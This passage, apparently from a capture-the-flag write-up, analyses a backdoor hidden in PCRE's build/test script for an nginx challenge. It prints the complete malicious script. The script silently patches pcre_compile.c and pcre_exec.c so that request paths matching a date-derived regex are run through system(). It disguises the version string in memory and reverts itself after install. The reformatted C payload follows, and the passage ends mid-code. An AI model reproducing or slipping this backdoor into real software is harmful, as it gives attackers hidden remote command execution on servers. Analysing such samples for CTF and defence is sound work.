</span></span><span style="display:flex;"><span>sed <span style="color:#f92672">-</span>i <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">368</span>,<span style="color:#ae81ff">370</span>d<span style="color:#960050;background-color:#1e0010">&#39;</span> .<span style="color:#f92672">/</span>testdata<span style="color:#f92672">/</span>testoutput18<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#f92672">&lt;&lt;</span>EOF <span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>testdata<span style="color:#f92672">/</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>pcre_compile.c b<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span>index c742227..c2419ef <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">10</span> <span style="color:#960050;background-color:#1e0010">@@</span> COMPILE_PCREx macro will already be appropriately set. <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#undef PCRE_INCLUDED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;fcntl.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;string.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#f92672">&lt;</span>sys<span style="color:#f92672">/</span>mman.h<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">/* Macro for setting individual bits in class bitmaps. */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8974</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">8978</span>,<span style="color:#ae81ff">14</span> <span style="color:#960050;background-color:#1e0010">@@</span> Returns:        pointer to compiled data block, or NULL on error,
</span></span><span style="display:flex;"><span>                 with errorptr and erroroffset set
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> alph <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;b.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> date_s <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;d.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>pcre<span style="color:#f92672">*</span> bd_re <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN pcre <span style="color:#f92672">*</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pcre_compile</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>errorptr,
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8998</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9010</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">pcre32_compile2</span>(pattern, options, NULL, errorptr, erroroffset, tables);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN pcre <span style="color:#f92672">*</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pcre_compile2</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errorcodeptr,
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9012</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9025</span>,<span style="color:#ae81ff">9</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#a6e22e">pcre32_compile2</span>(PCRE_SPTR32 pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errorcodeptr,
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>errorptr, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>erroroffset, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tables)
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) { bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#66d9ef">int</span> f<span style="color:#f92672">=</span><span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);<span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);<span style="color:#a6e22e">strcat</span>(b, alph);<span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">int</span> eo;bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span>e, <span style="color:#f92672">&amp;</span>eo, <span style="color:#ae81ff">0</span>);<span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;}<span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);<span style="color:#a6e22e">close</span>(f);<span style="color:#66d9ef">int</span> c<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;<span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;n&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;g&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;i&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;n&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;8&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;.&#39;</span>) {c<span style="color:#f92672">++</span>; <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uint64_t</span>)p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);<span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE);<span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;}} }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> REAL_PCRE <span style="color:#f92672">*</span>re;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">/* For final END opcode */</span>
</span></span><span style="display:flex;"><span> pcre_int32 firstcharflags, reqcharflags;
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>pcre_exec.c b<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span>index <span style="color:#ae81ff">55230</span>cd.<span style="color:#ae81ff">.3399738</span> <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">6347</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">6347</span>,<span style="color:#ae81ff">10</span> <span style="color:#960050;background-color:#1e0010">@@</span> Returns:          <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> success; value is the number of elements filled in
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> failed to match
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> some kind of unexpected problem
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">int</span> bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">// Defined in other c file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#66d9ef">extern</span> pcre<span style="color:#f92672">*</span> bd_re;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> alph;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN <span style="color:#66d9ef">int</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">6398</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">6402</span>,<span style="color:#ae81ff">11</span> <span style="color:#960050;background-color:#1e0010">@@</span> frame_zero.Xnextframe <span style="color:#f92672">=</span> NULL;            <span style="color:#75715e">/* None are allocated yet */</span>
</span></span><span style="display:flex;"><span> md<span style="color:#f92672">-&gt;</span>match_frames_base <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>frame_zero;
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">// Here is the target, good luck:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#75715e">// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header &#34;Ticket: ticket{[ CENSORED ]}&#34; [ CENSORED ]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x2000</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span> (bd<span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">if</span> (bd_re) { <span style="color:#66d9ef">int</span> ov[<span style="color:#ae81ff">30</span>];<span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_exec</span>(bd_re, NULL, subject, <span style="color:#a6e22e">strlen</span>(subject), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ov, <span style="color:#66d9ef">sizeof</span>(ov)<span style="color:#f92672">/</span><span style="color:#66d9ef">sizeof</span>(ov[<span style="color:#ae81ff">0</span>]));<span style="color:#66d9ef">if</span> (rc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>) { <span style="color:#a6e22e">pcre_copy_substring</span>(subject, ov, rc, <span style="color:#ae81ff">1</span>, buf, <span style="color:#66d9ef">sizeof</span>(buf));<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>(buf);<span style="color:#a6e22e">system</span>(m); }} bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">/* Check for the special magic call that measures the size of the stack used
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> per recursive call of match(). Without the funny casting for sizeof, a Windows
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> compiler gave this error: &#34;unary minus operator applied to unsigned type,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">EOF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">patch -p1 &lt; &#39;testdata/ &#39; 2&gt;&amp;1 1&gt;/dev/null
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo $(($(date +%s) / 86400)) | md5sum | cut -d&#39; &#39; -f1 |  awk &#39;{ for(i=0;i&lt;10;i++) printf &#34;%s&#34;, $1 }&#39; &gt; a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo &#39;&#34;&#39;$(echo &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34; | grep -o . | shuf --random-source ./a| tr -d &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;)&#39;&#34;&#39; &gt; b.h; rm -f ./a;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo &#39;&#34;&#39;$(date +&#34;%m.%d.%y&#34; | tr -d &#39;0&#39;)&#39;&#34;&#39; &gt; d.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">cat &lt;&lt;EOF &gt; cleanup-tests
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">make \$@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if [ &#34;\$1&#34; = &#34;install&#34; ]; then patch -R -p1 &lt; &#39;testdata/ &#39; 2&gt;&amp;1 1&gt;/dev/null; rm -f &#39;testdata/ &#39;; rm -f cleanup-tests b.h d.h; fi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">EOF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">chmod +x cleanup-tests; make $@
</span></span></span></code></pre></div><p>It&rsquo;s add content to file <code>pre_compile.c</code> and <code>pre_exec.c</code></p>
<p>The patches in <code>pre_compile.c</code> file of <code>pcre_compile2</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;fcntl.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;string.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> alph <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;b.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> date_s <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;d.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>;
</span></span><span style="display:flex;"><span>pcre <span style="color:#f92672">*</span> bd_re <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, alph);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> eo;
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span> e, <span style="color:#f92672">&amp;</span> eo, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>            bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);
</span></span><span style="display:flex;"><span>        b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> ) <span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(f);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>            c<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> )((<span style="color:#66d9ef">uint64_t</span>) p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);
</span></span><span style="display:flex;"><span>            p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The patches in <code>pre_exec.c</code> file of <code>pcre_exec</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Defined in other c file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> pcre <span style="color:#f92672">*</span> bd_re;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> alph;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Here is the target, good luck:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header &#34;Ticket: ticket{[ CENSORED ]}&#34; [ CENSORED ]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x2000</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bd_re) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> ov[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_exec</span>(bd_re, NULL, subject, <span style="color:#a6e22e">strlen</span>(subject), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ov, <span style="color:#66d9ef">sizeof</span>(ov) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(ov[<span style="color:#ae81ff">0</span>]));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (rc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>) {
